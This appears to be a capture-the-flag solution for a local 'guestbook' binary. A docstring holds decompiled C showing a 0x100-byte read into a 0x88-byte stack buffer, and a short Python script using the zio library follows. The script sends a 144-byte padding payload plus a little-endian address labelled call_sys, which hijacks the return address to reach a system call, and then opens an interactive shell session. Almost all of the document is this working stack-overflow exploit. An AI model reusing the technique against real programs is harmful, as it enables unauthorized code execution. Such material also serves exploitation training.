'''
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v4; // [sp+0h] [bp-88h]@1

  write(1, "Input your message:\n", 0x14uLL);
  read(0, &v4, 0x100uLL);
  return write(1, "I have received your message, Thank you!\n", 0x29uLL);
}

ssize_t readmessage()
{
  __int64 v1; // [sp+0h] [bp-88h]@1

  return read(0, &v1, 0x100uLL);
}

'''
from zio import *

io = zio('./guestbook')

io.read_until('Input your message:')

call_sys = 0x0000000000400620

payload = 'A' * 144 + l64(call_sys)

io.writeline(payload)
io.interact()
